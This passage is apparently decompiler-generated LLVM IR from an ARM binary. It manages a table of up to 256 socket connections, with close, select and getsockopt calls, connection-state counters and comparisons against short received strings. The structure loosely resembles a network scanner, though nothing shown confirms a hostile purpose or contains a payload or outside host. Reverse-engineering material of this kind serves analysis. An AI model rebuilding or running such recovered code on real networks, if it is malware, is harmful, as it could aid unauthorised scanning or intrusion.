  %v4_12158406 = inttoptr i32 %v3_12158405 to i32*
  store i32 0, i32* %v4_12158406, align 4
  br label %dec_label_pc_12148.dec_label_pc_12148_crit_edge

dec_label_pc_12148.dec_label_pc_12148_crit_edge:  ; preds = %dec_label_pc_12140, %dec_label_pc_12148.dec_label_pc_12148_crit_edge
  %v0_12148.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_12158.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1214c = add i32 %v0_12148.pre, 4
  store i32 %v1_1214c, i32* %r3.global-to-local, align 4
  %v1_12150 = add i32 %v0_12148.pre, 1672
  store i32 %v1_12150, i32* %ip.global-to-local, align 4
  %v7_12154 = icmp eq i32 %v1_1214c, 128
  %v2_12158 = load i32, i32* @sp, align 4
  %v3_12158 = add i32 %v2_12158, %v1_12150
  %v4_12158 = inttoptr i32 %v3_12158 to i32*
  store i32 %v0_12158.pre, i32* %v4_12158, align 4
  br i1 %v7_12154, label %dec_label_pc_12160, label %dec_label_pc_12148.dec_label_pc_12148_crit_edge

dec_label_pc_12160:                               ; preds = %dec_label_pc_12148.dec_label_pc_12148_crit_edge
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_12160 = load i32, i32* %r2.global-to-local, align 4
  %v1_12168407 = add i32 %v0_12160, 4
  store i32 %v1_12168407, i32* %r3.global-to-local, align 4
  %v1_1216c408 = add i32 %v0_12160, 1544
  store i32 %v1_1216c408, i32* %lr.global-to-local, align 4
  %v7_12170409 = icmp eq i32 %v1_12168407, 128
  %v2_12174410 = load i32, i32* @sp, align 4
  %v3_12174411 = add i32 %v2_12174410, %v1_1216c408
  %v4_12174412 = inttoptr i32 %v3_12174411 to i32*
  store i32 %v0_12160, i32* %v4_12174412, align 4
  br i1 %v7_12170409, label %dec_label_pc_1217c, label %dec_label_pc_12164.dec_label_pc_12164_crit_edge

dec_label_pc_12164.dec_label_pc_12164_crit_edge:  ; preds = %dec_label_pc_12160, %dec_label_pc_12164.dec_label_pc_12164_crit_edge
  %v0_12164.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_12174.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_12168 = add i32 %v0_12164.pre, 4
  store i32 %v1_12168, i32* %r3.global-to-local, align 4
  %v1_1216c = add i32 %v0_12164.pre, 1544
  store i32 %v1_1216c, i32* %lr.global-to-local, align 4
  %v7_12170 = icmp eq i32 %v1_12168, 128
  %v2_12174 = load i32, i32* @sp, align 4
  %v3_12174 = add i32 %v2_12174, %v1_1216c
  %v4_12174 = inttoptr i32 %v3_12174 to i32*
  store i32 %v0_12174.pre, i32* %v4_12174, align 4
  br i1 %v7_12170, label %dec_label_pc_1217c, label %dec_label_pc_12164.dec_label_pc_12164_crit_edge

dec_label_pc_1217c:                               ; preds = %dec_label_pc_12164.dec_label_pc_12164_crit_edge, %dec_label_pc_12160
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_1217c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_1217c, i32* @r6, align 4
  store i32 %v0_1217c, i32* @r5, align 4
  store i32 %v0_1217c, i32* @r7, align 4
  store i32 %v0_1217c, i32* %stack_var_-52, align 4
  br label %dec_label_pc_121f4

dec_label_pc_12190:                               ; preds = %dec_label_pc_1221c, %dec_label_pc_121f4
  %storemerge223 = phi i32 [ 30, %dec_label_pc_121f4 ], [ 5, %dec_label_pc_1221c ]
  store i32 %storemerge223, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cdf0.240 to i32), i32* %r2.global-to-local, align 4
  %v2_12194 = load i32, i32* @global_var_1cdf0.240, align 4
  store i32 %v2_12194, i32* %r3.global-to-local, align 4
  %v1_12198 = add i32 %v2_12208, 8
  %v2_12198 = inttoptr i32 %v1_12198 to i32*
  %v3_12198 = load i32, i32* %v2_12198, align 4
  store i32 %v3_12198, i32* %r2.global-to-local, align 4
  %v2_1219c = sub i32 %v2_12194, %v3_12198
  store i32 %v2_1219c, i32* %r3.global-to-local, align 4
  %v3_121a0 = icmp uge i32 %v2_1219c, %storemerge223
  store i1 %v3_121a0, i1* %cpsr_c.global-to-local, align 1
  %v9_121a0 = icmp eq i32 %v2_1219c, %storemerge223
  store i1 %v9_121a0, i1* %cpsr_z.global-to-local, align 1
  %v2_121a4 = xor i1 %v9_121a0, true
  %v3_121a4 = and i1 %v3_121a0, %v2_121a4
  br i1 %v3_121a4, label %dec_label_pc_1225c, label %dec_label_pc_121a8

dec_label_pc_121a8:                               ; preds = %dec_label_pc_12190
  store i1 %v2_12210, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_12210, i1* %cpsr_z.global-to-local, align 1
  %v1_1222c = add i32 %v2_12208, 4
  %v2_1222c = inttoptr i32 %v1_1222c to i32*
  %v3_1222c = load i32, i32* %v2_1222c, align 4
  br i1 %v7_12210, label %dec_label_pc_1222c, label %dec_label_pc_121b0

dec_label_pc_121b0:                               ; preds = %dec_label_pc_121a8
  store i32 %v3_1222c, i32* %ip.global-to-local, align 4
  %v3_121b4 = udiv i32 %v3_1222c, 32
  store i32 %v2_12238, i32* %r0.global-to-local, align 4
  %v3_121bc = mul nuw nsw i32 %v3_121b4, 4
  %v2_121c0 = add i32 %v3_121bc, %v2_12238
  store i32 %v2_121c0, i32* %r3.global-to-local, align 4
  %v1_121c4 = add i32 %v2_121c0, -184
  %v2_121c4 = inttoptr i32 %v1_121c4 to i32*
  %v3_121c4 = load i32, i32* %v2_121c4, align 4
  %v1_121c8 = urem i32 %v3_1222c, 32
  store i32 %v1_121c8, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v7_121d0 = shl i32 1, %v1_121c8
  %v8_121d0 = or i32 %v3_121c4, %v7_121d0
  store i32 %v8_121d0, i32* %r2.global-to-local, align 4
  store i32 %v8_121d0, i32* %v2_121c4, align 4
  %v0_121d8 = load i32, i32* @r6, align 4
  %v1_121d8 = load i32, i32* %ip.global-to-local, align 4
  %v3_121d8 = icmp uge i32 %v0_121d8, %v1_121d8
  store i1 %v3_121d8, i1* %cpsr_c.global-to-local, align 1
  %v9_121d8 = icmp eq i32 %v0_121d8, %v1_121d8
  store i1 %v9_121d8, i1* %cpsr_z.global-to-local, align 1
  %v5_121dc = icmp slt i32 %v0_121d8, %v1_121d8
  br i1 %v5_121dc, label %bb308, label %bb309

bb308:                                            ; preds = %dec_label_pc_121b0
  store i32 %v1_121d8, i32* @r6, align 4
  br label %bb309

bb309:                                            ; preds = %dec_label_pc_1221c, %dec_label_pc_12ebc, %dec_label_pc_12290, %bb311, %dec_label_pc_121b0, %bb308
  %v3_121e0 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_121e0, i32* %r3.global-to-local, align 4
  %v1_121e4 = add i32 %v3_121e0, 1
  store i32 %v1_121e4, i32* %r2.global-to-local, align 4
  %v2_121e8 = icmp ugt i32 %v1_121e4, 254
  store i1 %v2_121e8, i1* %cpsr_c.global-to-local, align 1
  %v7_121e8 = icmp eq i32 %v1_121e4, 255
  store i1 %v7_121e8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_121e4, i32* %stack_var_-52, align 4
  %v8_121f0 = icmp sgt i32 %v1_121e4, 255
  br i1 %v8_121f0, label %dec_label_pc_1229c, label %dec_label_pc_121f4

dec_label_pc_121f4:                               ; preds = %bb309, %dec_label_pc_1217c
  %v0_12200 = phi i32 [ %v1_121e4, %bb309 ], [ %v0_1217c, %dec_label_pc_1217c ]
  store i32 ptrtoint (i32* @global_var_1ce10.252 to i32), i32* %r0.global-to-local, align 4
  %v3_121f8 = mul i32 %v0_12200, 256
  store i32 %v3_121f8, i32* %r3.global-to-local, align 4
  %v2_121fc = load i32, i32* @global_var_1ce10.252, align 4
  store i32 %v2_121fc, i32* %r1.global-to-local, align 4
  %v2_12204 = mul i32 %v0_12200, 288
  store i32 %v2_12204, i32* %r2.global-to-local, align 4
  %v2_12208 = add i32 %v2_121fc, %v2_12204
  store i32 %v2_12208, i32* @r4, align 4
  %v1_1220c = add i32 %v2_12208, 12
  %v2_1220c = inttoptr i32 %v1_1220c to i32*
  %v3_1220c = load i32, i32* %v2_1220c, align 4
  store i32 %v3_1220c, i32* %ip.global-to-local, align 4
  %v2_12210 = icmp ne i32 %v3_1220c, 0
  store i1 %v2_12210, i1* %cpsr_c.global-to-local, align 1
  %v7_12210 = icmp eq i32 %v3_1220c, 1
  store i1 %v7_12210, i1* %cpsr_z.global-to-local, align 1
  %v2_12214 = xor i1 %v7_12210, true
  %v3_12214 = and i1 %v2_12210, %v2_12214
  br i1 %v3_12214, label %dec_label_pc_12190, label %dec_label_pc_1221c

dec_label_pc_1221c:                               ; preds = %dec_label_pc_121f4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1221c = icmp eq i32 %v3_1220c, 0
  store i1 %v2_1221c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1221c, label %bb309, label %dec_label_pc_12190

dec_label_pc_1222c:                               ; preds = %dec_label_pc_121a8
  store i32 %v3_1222c, i32* %r0.global-to-local, align 4
  %v3_12230 = udiv i32 %v3_1222c, 32
  %v3_12234 = mul nuw nsw i32 %v3_12230, 4
  store i32 %v2_12238, i32* %lr.global-to-local, align 4
  %v2_1223c = add i32 %v3_12234, %v2_12238
  store i32 %v2_1223c, i32* %r3.global-to-local, align 4
  %v1_12240 = add i32 %v2_1223c, -312
  %v2_12240 = inttoptr i32 %v1_12240 to i32*
  %v3_12240 = load i32, i32* %v2_12240, align 4
  %v1_12244 = urem i32 %v3_1222c, 32
  store i32 %v1_12244, i32* %r1.global-to-local, align 4
  %v7_12248 = shl i32 1, %v1_12244
  %v8_12248 = or i32 %v3_12240, %v7_12248
  store i32 %v8_12248, i32* %r2.global-to-local, align 4
  %v0_1224c = load i32, i32* @r5, align 4
  %v3_1224c = icmp uge i32 %v0_1224c, %v3_1222c
  store i1 %v3_1224c, i1* %cpsr_c.global-to-local, align 1
  %v9_1224c = icmp eq i32 %v0_1224c, %v3_1222c
  store i1 %v9_1224c, i1* %cpsr_z.global-to-local, align 1
  %v5_12250 = icmp slt i32 %v0_1224c, %v3_1222c
  br i1 %v5_12250, label %bb310, label %bb311

bb310:                                            ; preds = %dec_label_pc_1222c
  store i32 %v3_1222c, i32* @r5, align 4
  br label %bb311

bb311:                                            ; preds = %dec_label_pc_1222c, %bb310
  store i32 %v8_12248, i32* %v2_12240, align 4
  br label %bb309

dec_label_pc_1225c:                               ; preds = %dec_label_pc_12190
  %v1_1225c = add i32 %v2_12208, 4
  %v2_1225c = inttoptr i32 %v1_1225c to i32*
  %v3_1225c = load i32, i32* %v2_1225c, align 4
  store i32 %v3_1225c, i32* %r0.global-to-local, align 4
  %v1_12260 = call i32 @close(i32 %v3_1225c)
  store i32 %v1_12260, i32* %r0.global-to-local, align 4
  %v0_12264 = load i32, i32* @r4, align 4
  %v1_12264 = add i32 %v0_12264, 12
  %v2_12264 = inttoptr i32 %v1_12264 to i32*
  %v3_12264 = load i32, i32* %v2_12264, align 4
  store i32 %v3_12264, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_1226c = icmp ugt i32 %v3_12264, 1
  store i1 %v2_1226c, i1* %cpsr_c.global-to-local, align 1
  %v7_1226c = icmp eq i32 %v3_12264, 2
  store i1 %v7_1226c, i1* %cpsr_z.global-to-local, align 1
  %v2_12270 = add i32 %v0_12264, 4
  %v3_12270 = inttoptr i32 %v2_12270 to i32*
  store i32 -1, i32* %v3_12270, align 4
  %v2_12274 = xor i1 %v2_1226c, true
  %v3_12274 = or i1 %v7_1226c, %v2_12274
  br i1 %v3_12274, label %dec_label_pc_12ebc, label %dec_label_pc_12278

dec_label_pc_12278:                               ; preds = %dec_label_pc_1225c
  %v0_12278 = load i32, i32* @r4, align 4
  %v1_12278 = add i32 %v0_12278, 284
  %v2_12278 = inttoptr i32 %v1_12278 to i8*
  %v3_12278 = load i8, i8* %v2_12278, align 1
  %v4_12278 = zext i8 %v3_12278 to i32
  %v1_1227c = add nuw nsw i32 %v4_12278, 1
  %v1_12280 = urem i32 %v1_1227c, 256
  store i32 %v1_12280, i32* %r3.global-to-local, align 4
  %v2_12284 = icmp ugt i32 %v1_12280, 9
  store i1 %v2_12284, i1* %cpsr_c.global-to-local, align 1
  %v7_12284 = icmp eq i32 %v1_12280, 10
  store i1 %v7_12284, i1* %cpsr_z.global-to-local, align 1
  %v1_12288 = trunc i32 %v1_1227c to i8
  store i8 %v1_12288, i8* %v2_12278, align 1
  %v0_1228c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1228c, label %dec_label_pc_12ebc, label %dec_label_pc_12290

dec_label_pc_12290:                               ; preds = %dec_label_pc_12278
  %v0_12290 = load i32, i32* @r4, align 4
  store i32 %v0_12290, i32* @r0, align 4
  %v0_12294 = call i32 @function_1141c()
  store i32 %v0_12294, i32* %r0.global-to-local, align 4
  br label %bb309

dec_label_pc_1229c:                               ; preds = %bb309
  store i32 1, i32* %stack_var_-64, align 4
  %v0_122a4 = load i32, i32* @r6, align 4
  %v1_122a4 = load i32, i32* @r5, align 4
  %v3_122a4 = icmp uge i32 %v0_122a4, %v1_122a4
  store i1 %v3_122a4, i1* %cpsr_c.global-to-local, align 1
  %v9_122a4 = icmp eq i32 %v0_122a4, %v1_122a4
  store i1 %v9_122a4, i1* %cpsr_z.global-to-local, align 1
  %v5_122a8 = icmp slt i32 %v0_122a4, %v1_122a4
  %storemerge76 = select i1 %v5_122a8, i32 %v1_122a4, i32 %v0_122a4
  store i32 %v2_122bc, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_122c4, i32* %ip.global-to-local, align 4
  store i32 %v2_122c8, i32* %r1.global-to-local, align 4
  %v1_122cc = add i32 %storemerge76, 1
  store i32 %v1_122cc, i32* %r0.global-to-local, align 4
  %v6_122d8 = call i32 @_select(i32 %v1_122cc, i32 %v2_122c8, i32 %v2_122bc, i32 0, i32 %v2_122c4)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_122e0 = call i32 @time(i32* null)
  store i32 ptrtoint (i32* @global_var_1cdf0.240 to i32), i32* %lr.global-to-local, align 4
  store i32 %v2_122e0, i32* @global_var_1cdf0.240, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  br label %dec_label_pc_12334

dec_label_pc_122fc:                               ; preds = %dec_label_pc_12358, %dec_label_pc_12ecc
  %v0_12310 = phi i32 [ %v3_1234c, %dec_label_pc_12358 ], [ %v0_122fc.pre, %dec_label_pc_12ecc ]
  %v3_122fc = udiv i32 %v0_12310, 32
  %v3_12300 = mul nuw nsw i32 %v3_122fc, 4
  store i32 %v2_12238, i32* %lr.global-to-local, align 4
  %v2_12308 = add i32 %v3_12300, %v2_12238
  store i32 %v2_12308, i32* %r3.global-to-local, align 4
  %v1_1230c = add i32 %v2_12308, -184
  %v2_1230c = inttoptr i32 %v1_1230c to i32*
  %v3_1230c = load i32, i32* %v2_1230c, align 4
  %v1_12310 = urem i32 %v0_12310, 32
  store i32 %v1_12310, i32* %r1.global-to-local, align 4
  %v2_12314 = add nsw i32 %v1_12310, -1
  %v3_12314 = shl i32 1, %v2_12314
  %v4_12314 = and i32 %v3_12314, %v3_1230c
  %v5_12314 = icmp ne i32 %v4_12314, 0
  store i1 %v5_12314, i1* %cpsr_c.global-to-local, align 1
  %v6_12314 = lshr i32 %v3_1230c, %v1_12310
  store i32 %v6_12314, i32* %r2.global-to-local, align 4
  %v1_12318 = urem i32 %v6_12314, 2
  %v2_12318 = icmp eq i32 %v1_12318, 0
  store i1 %v2_12318, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12318, label %dec_label_pc_12320, label %dec_label_pc_12484.preheader

dec_label_pc_12484.preheader:                     ; preds = %dec_label_pc_122fc
  %v0_12484102 = load i32, i32* @r5, align 4
  %v1_12484103 = add i32 %v0_12484102, 12
  %v2_12484104 = inttoptr i32 %v1_12484103 to i32*
  %v3_12484105 = load i32, i32* %v2_12484104, align 4
  store i32 %v3_12484105, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12488101107 = icmp eq i32 %v3_12484105, 0
  store i1 %v2_12488101107, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12488101107, label %dec_label_pc_12320, label %dec_label_pc_12490.lr.ph

dec_label_pc_12320:                               ; preds = %dec_label_pc_12484.loopexit, %dec_label_pc_12484.preheader, %dec_label_pc_122fc, %bb348, %dec_label_pc_12de8, %dec_label_pc_12334, %dec_label_pc_12ee0, %dec_label_pc_12e2c
  %v3_12320 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_12320, i32* %r3.global-to-local, align 4
  %v1_12324 = add i32 %v3_12320, 1
  store i32 %v1_12324, i32* %r2.global-to-local, align 4
  %v2_12328 = icmp ugt i32 %v1_12324, 254
  store i1 %v2_12328, i1* %cpsr_c.global-to-local, align 1
  %v7_12328 = icmp eq i32 %v1_12324, 255
  store i1 %v7_12328, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_12324, i32* %stack_var_-52, align 4
  %v8_12330 = icmp sgt i32 %v1_12324, 255
  br i1 %v8_12330, label %dec_label_pc_11cc8, label %dec_label_pc_12334

dec_label_pc_12334:                               ; preds = %dec_label_pc_12320, %dec_label_pc_1229c
  %v0_12340 = phi i32 [ %v1_12324, %dec_label_pc_12320 ], [ 0, %dec_label_pc_1229c ]
  store i32 ptrtoint (i32* @global_var_1ce10.252 to i32), i32* %ip.global-to-local, align 4
  %v3_12338 = mul i32 %v0_12340, 256
  store i32 %v3_12338, i32* %r3.global-to-local, align 4
  %v2_1233c = load i32, i32* @global_var_1ce10.252, align 4
  store i32 %v2_1233c, i32* %r1.global-to-local, align 4
  %v2_12344 = mul i32 %v0_12340, 288
  store i32 %v2_12344, i32* %r2.global-to-local, align 4
  %v2_12348 = add i32 %v2_1233c, %v2_12344
  store i32 %v2_12348, i32* @r5, align 4
  %v1_1234c = add i32 %v2_12348, 4
  %v2_1234c = inttoptr i32 %v1_1234c to i32*
  %v3_1234c = load i32, i32* %v2_1234c, align 4
  store i32 %v3_1234c, i32* %r4.global-to-local, align 4
  %v2_12350 = icmp eq i32 %v3_1234c, -1
  store i1 %v2_12350, i1* %cpsr_c.global-to-local, align 1
  %v7_12350 = icmp eq i32 %v3_1234c, -1
  store i1 %v7_12350, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12350, label %dec_label_pc_12320, label %dec_label_pc_12358

dec_label_pc_12358:                               ; preds = %dec_label_pc_12334
  %v3_12358 = udiv i32 %v3_1234c, 32
  %v3_1235c = mul nuw nsw i32 %v3_12358, 4
  store i32 %v2_12238, i32* %lr.global-to-local, align 4
  %v2_12364 = add i32 %v3_1235c, %v2_12238
  store i32 %v2_12364, i32* %r3.global-to-local, align 4
  %v1_12368 = add i32 %v2_12364, -312
  %v2_12368 = inttoptr i32 %v1_12368 to i32*
  %v3_12368 = load i32, i32* %v2_12368, align 4
  %v1_1236c = urem i32 %v3_1234c, 32
  store i32 %v1_1236c, i32* %r1.global-to-local, align 4
  %v2_12370 = add nsw i32 %v1_1236c, -1
  %v3_12370 = shl i32 1, %v2_12370
  %v4_12370 = and i32 %v3_12368, %v3_12370
  %v5_12370 = icmp ne i32 %v4_12370, 0
  store i1 %v5_12370, i1* %cpsr_c.global-to-local, align 1
  %v6_12370 = lshr i32 %v3_12368, %v1_1236c
  store i32 %v6_12370, i32* %r2.global-to-local, align 4
  %v1_12374 = urem i32 %v6_12370, 2
  %v2_12374 = icmp eq i32 %v1_12374, 0
  store i1 %v2_12374, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12374, label %dec_label_pc_122fc, label %dec_label_pc_1237c

dec_label_pc_1237c:                               ; preds = %dec_label_pc_12358
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-56, align 4
  store i32 %v2_12970, i32* %r3.global-to-local, align 4
  store i32 %v2_128bc, i32* %ip.global-to-local, align 4
  store i32 %v3_1234c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v8_123ac = call i32 @getsockopt(i32 %v3_1234c, i32 1, i32 4, i32* nonnull %stack_var_-48, i32* nonnull %stack_var_-56)
  %v3_123b0 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_123b0, i32* %r3.global-to-local, align 4
  %v2_123b4 = or i32 %v3_123b0, %v8_123ac
  store i32 %v2_123b4, i32* %r0.global-to-local, align 4
  %v4_123b4 = icmp eq i32 %v2_123b4, 0
  store i1 %v4_123b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_123b4, label %dec_label_pc_123bc, label %dec_label_pc_12ee0

dec_label_pc_123bc:                               ; preds = %dec_label_pc_1237c
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_123c0 = load i32, i32* @r5, align 4
  %v2_123c0 = add i32 %v1_123c0, 12
  %v3_123c0 = inttoptr i32 %v2_123c0 to i32*
  store i32 2, i32* %v3_123c0, align 4
  %v0_123c4 = call i32 @function_10bd8()
  %v3_123cc = load i8, i8* @global_var_1cded.247, align 1
  %v4_123cc = zext i8 %v3_123cc to i32
  store i32 %v4_123cc, i32* %r2.global-to-local, align 4
  %v2_123d0 = load i8, i8* bitcast (i8** @global_var_1cdec.246 to i8*), align 4
  %v3_123d0 = zext i8 %v2_123d0 to i32
  %v4_123d4 = mul nuw nsw i32 %v4_123cc, 256
  %v5_123d4 = or i32 %v3_123d0, %v4_123d4
  store i32 %v5_123d4, i32* %r1.global-to-local, align 4
  %v2_123d8 = urem i32 %v0_123c4, %v5_123d4
  store i32 ptrtoint (i32* @global_var_1cdbc.242 to i32), i32* %r3.global-to-local, align 4
  %v2_123e0 = load i32, i32* @global_var_1cdbc.242, align 4
  store i32 %v2_123e0, i32* %lr.global-to-local, align 4
  %v1_123e8 = load i32, i32* @r6, align 4
  %v9_123e8 = icmp eq i32 %v2_123e0, %v1_123e8
  store i1 %v9_123e8, i1* %cpsr_z.global-to-local, align 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v2_123d8, i32* %r0.global-to-local, align 4
  %v7_123f0 = icmp sgt i32 %v2_123e0, %v1_123e8
  br i1 %v7_123f0, label %dec_label_pc_123f4, label %dec_label_pc_12ec8

dec_label_pc_123f4:                               ; preds = %dec_label_pc_123bc
  %v2_123f8 = load i32, i32* @global_var_1cde8.244, align 4
  store i32 %v2_123f8, i32* %r3.global-to-local, align 4
  store i32 %v1_123e8, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12414

dec_label_pc_12404:                               ; preds = %dec_label_pc_1242c, %dec_label_pc_12414
  %v1_12404 = add i32 %v0_12404, 1
  store i32 %v1_12404, i32* %ip.global-to-local, align 4
  %v3_12408 = icmp uge i32 %v1_12404, %v2_123e0
  store i1 %v3_12408, i1* %cpsr_c.global-to-local, align 1
  %v9_12408 = icmp eq i32 %v1_12404, %v2_123e0
  store i1 %v9_12408, i1* %cpsr_z.global-to-local, align 1
  %v1_1240c = add i32 %v0_1240c, 16
  store i32 %v1_1240c, i32* %r3.global-to-local, align 4
  br i1 %v9_12408, label %dec_label_pc_12ec8, label %dec_label_pc_12414

dec_label_pc_12414:                               ; preds = %dec_label_pc_12404, %dec_label_pc_123f4
  %v0_12404 = phi i32 [ %v1_12404, %dec_label_pc_12404 ], [ %v1_123e8, %dec_label_pc_123f4 ]
  %v0_1240c = phi i32 [ %v1_1240c, %dec_label_pc_12404 ], [ %v2_123f8, %dec_label_pc_123f4 ]
  store i32 %v0_1240c, i32* %r1.global-to-local, align 4
  %v1_12418 = add i32 %v0_1240c, 9
  %v2_12418 = inttoptr i32 %v1_12418 to i8*
  %v3_12418 = load i8, i8* %v2_12418, align 1
  %v4_12418 = zext i8 %v3_12418 to i32
  store i32 %v4_12418, i32* %r2.global-to-local, align 4
  %v1_1241c = add i32 %v0_1240c, 8
  %v2_1241c = inttoptr i32 %v1_1241c to i8*
  %v3_1241c = load i8, i8* %v2_1241c, align 1
  %v4_1241c = zext i8 %v3_1241c to i32
  %v4_12420 = mul nuw nsw i32 %v4_12418, 256
  %v5_12420 = or i32 %v4_1241c, %v4_12420
  store i32 %v5_12420, i32* %r3.global-to-local, align 4
  %v3_12424 = icmp uge i32 %v5_12420, %v2_123d8
  store i1 %v3_12424, i1* %cpsr_c.global-to-local, align 1
  %v9_12424 = icmp eq i32 %v5_12420, %v2_123d8
  store i1 %v9_12424, i1* %cpsr_z.global-to-local, align 1
  %v2_12428 = xor i1 %v9_12424, true
  %v3_12428 = and i1 %v3_12424, %v2_12428
  br i1 %v3_12428, label %dec_label_pc_12404, label %dec_label_pc_1242c

dec_label_pc_1242c:                               ; preds = %dec_label_pc_12414
  %v1_1242c = add i32 %v0_1240c, 10
  %v2_1242c = inttoptr i32 %v1_1242c to i8*
  %v3_1242c = load i8, i8* %v2_1242c, align 1
  %v4_1242c = zext i8 %v3_1242c to i32
  store i32 %v4_1242c, i32* %r3.global-to-local, align 4
  %v1_12430 = add i32 %v0_1240c, 11
  %v2_12430 = inttoptr i32 %v1_12430 to i8*
  %v3_12430 = load i8, i8* %v2_12430, align 1
  %v4_12430 = zext i8 %v3_12430 to i32
  store i32 %v4_12430, i32* %r2.global-to-local, align 4
  %v4_12434 = mul nuw nsw i32 %v4_12430, 256
  %v5_12434 = or i32 %v4_12434, %v4_1242c
  store i32 %v5_12434, i32* %r3.global-to-local, align 4
  %v3_12438 = icmp uge i32 %v5_12434, %v2_123d8
  store i1 %v3_12438, i1* %cpsr_c.global-to-local, align 1
  %v9_12438 = icmp eq i32 %v5_12434, %v2_123d8
  store i1 %v9_12438, i1* %cpsr_z.global-to-local, align 1
  %v2_1243c = xor i1 %v3_12438, true
  %v3_1243c = or i1 %v9_12438, %v2_1243c
  br i1 %v3_1243c, label %dec_label_pc_12404, label %dec_label_pc_12ecc

dec_label_pc_12444:                               ; preds = %dec_label_pc_12758, %dec_label_pc_12628, %dec_label_pc_12774
  store i32 %v3_12628, i32* %r1.global-to-local, align 4
  %v0_12448 = load i32, i32* @sb, align 4
  store i32 %v0_12448, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_14634.381 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v5_12454 = call i32 @function_13b18(i32 %v0_12448, i32 %v3_12628, i32 ptrtoint ([5 x i8]* @global_var_14634.381 to i32), i32 4)
  store i32 %v5_12454, i32* %r0.global-to-local, align 4
  %v3_12458 = icmp eq i32 %v5_12454, -1
  store i1 %v3_12458, i1* %cpsr_c.global-to-local, align 1
  %v8_12458 = icmp eq i32 %v5_12454, -1
  store i1 %v8_12458, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_12454, i32* @r7, align 4
  br i1 %v3_12458, label %dec_label_pc_12464, label %dec_label_pc_12780

dec_label_pc_12464:                               ; preds = %dec_label_pc_12444
  %v0_12464 = load i32, i32* @sb, align 4
  store i32 %v0_12464, i32* %r0.global-to-local, align 4
  %v0_12468 = load i32, i32* @r5, align 4
  %v1_12468 = add i32 %v0_12468, 24
  %v2_12468 = inttoptr i32 %v1_12468 to i32*
  %v3_12468 = load i32, i32* %v2_12468, align 4
  store i32 %v3_12468, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1463c.383 to i32), i32* %r2.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v5_12474 = call i32 @function_13b18(i32 %v0_12464, i32 %v3_12468, i32 ptrtoint ([6 x i8]* @global_var_1463c.383 to i32), i32 5)
  store i32 %v5_12474, i32* %r0.global-to-local, align 4
  %v3_12478 = icmp eq i32 %v5_12474, -1
  store i1 %v3_12478, i1* %cpsr_c.global-to-local, align 1
  %v8_12478 = icmp eq i32 %v5_12474, -1
  store i1 %v8_12478, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_12474, i32* @r7, align 4
  br i1 %v3_12478, label %dec_label_pc_12484.loopexit, label %dec_label_pc_12780

dec_label_pc_12484.loopexit:                      ; preds = %dec_label_pc_12618, %dec_label_pc_12b5c, %dec_label_pc_12508, %dec_label_pc_12464, %dec_label_pc_12e38
  %v0_12484 = load i32, i32* @r5, align 4
  %v1_12484 = add i32 %v0_12484, 12
  %v2_12484 = inttoptr i32 %v1_12484 to i32*
  %v3_12484 = load i32, i32* %v2_12484, align 4
  store i32 %v3_12484, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12488101 = icmp eq i32 %v3_12484, 0
  store i1 %v2_12488101, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12488101, label %dec_label_pc_12320, label %dec_label_pc_12490.lr.ph

dec_label_pc_12490.lr.ph:                         ; preds = %dec_label_pc_12484.preheader, %dec_label_pc_12484.loopexit
  %v0_12490133 = phi i32 [ %v0_12484, %dec_label_pc_12484.loopexit ], [ %v0_12484102, %dec_label_pc_12484.preheader ]
  br label %dec_label_pc_12490

dec_label_pc_12488thread-pre-split.thread:        ; preds = %dec_label_pc_12854, %dec_label_pc_12908, %dec_label_pc_129bc, %dec_label_pc_12a70, %dec_label_pc_12c7c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_12490

